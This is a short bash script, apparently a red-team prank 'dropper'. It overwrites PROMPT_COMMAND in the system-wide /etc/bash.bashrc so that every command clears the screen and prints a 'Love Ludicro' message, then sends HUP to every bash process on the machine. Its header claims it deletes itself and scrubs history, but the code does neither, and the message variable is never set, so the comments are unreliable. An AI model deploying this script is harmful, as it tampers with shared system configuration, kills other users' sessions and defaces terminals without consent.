#!/bin/bash

# === Red Team Ludicro Love Dropper ===
# Adds a message after every command using PROMPT_COMMAND,
# Forces reload with pkill -HUP bash,
# Then deletes itself and scrubs history

TARGET_BASHRC="/etc/bash.bashrc"

echo "[+] Injecting Ludicro love message into $TARGET_BASHRC..."

# Remove any existing PROMPT_COMMANDs
sed -i '/PROMPT_COMMAND=/d' "$TARGET_BASHRC"

# Add the specified PROMPT_COMMAND line
printf "PROMPT_COMMAND='clear; echo -e \"\\e[1;91m\\n$MESSAGE\\nLove Ludicro <3\\e[0m\"'\n" >> "$TARGET_BASHRC"


echo "[+] Message added."

# Force all bash sessions to reload the config
echo "[*] Forcing reload with pkill -HUP bash..."
pkill -HUP bash

echo "[+] Message deployed and cleaned. Love, Ludicro"
